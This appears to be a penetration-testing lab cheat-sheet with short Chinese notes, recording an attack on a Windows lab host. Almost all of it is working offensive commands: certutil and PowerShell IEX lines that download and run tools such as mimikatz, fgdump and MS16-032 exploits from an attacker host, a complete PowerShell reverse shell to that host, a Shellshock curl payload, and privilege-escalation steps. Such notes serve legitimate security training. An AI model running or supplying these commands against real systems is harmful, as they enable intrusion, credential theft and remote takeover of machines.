nmap -sC -sV -Pn 10.11.1.50 > nmap.txt
nmap -p-  10.11.1.50 > nmapall.txt

gobuster dir  -u http://10.11.1.50/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php > gobuster.txt



1.nmap掃描出80及9505,drupalgedden不可用,嘗試9505漏洞使用https://www.exploit-db.com/exploits/39161
2.修改腳本內容,要起本地80提供nc.exe,及起一個443reverse listen

certutil.exe -urlcache -split -f http://192.168.119.134/MSFRottenPotato.exe MSFRottenPotato.exe
certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
certutil.exe -urlcache -split -f http://192.168.119.134/reverse.php
certutil.exe -urlcache -split -f http://192.168.119.134/Chimichurri.exe root.exe
certutil.exe -urlcache -split -f http://192.168.119.134/PowerUp.ps1 PowerUp.ps1
certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz.exe mimikatz.exe
certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz_trunk.exe mimikatz_trunk.exe
certutil.exe -urlcache -split -f http://192.168.119.134/fgdump.exe fgdump.exe
certutil.exe -urlcache -split -f http://192.168.119.134/ms16-032.exe ms16-032.exe
certutil.exe -urlcache -split -f http://192.168.119.134/ms16-0321.exe ms16-0321.exe
certutil.exe -urlcache -split -f http://192.168.119.134/Invoke-MS16-032.ps1 Invoke.ps1
certutil.exe -urlcache -split -f http://192.168.119.134/39719.ps1 39719.ps1

$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

for /f eol^=^"^ delims^=^" %a in (C:\Users\Bethany\AppData\permissions.txt) do cmd.exe /c icacls "%a"

runas.exe /savecred /user:administrator  mimikatz.exe "%sysdrive%\testScripts\testscript1.ps1"


IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/Sherlock.ps1')
IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/PowerUp.ps1')
Invoke-Allchecks 可以看到sarah的default password

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT

C:\Users\Bethany\Desktop>\MSFRottenPotato.exe * C:\Users\Bethany\Desktop\shell.bat


curl -A "() { :;};echo; ping 192.168.119.134 " http://10.11.1.50/scripts/password-hash.sh


powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.119.134",6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Sherlock.ps1')
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-MS16032.ps1')
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-MS16-032.ps1')
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/PowerUp.ps1')
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/ms16_032_intrd_mod.ps1')
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/39719.ps1')

Invoke-Allchecks 可以看到sarah的default password

powershell -ExecutionPolicy bypass -File ./39719.ps1
powershell -ExecutionPolicy bypass -File ./ms16-032.exe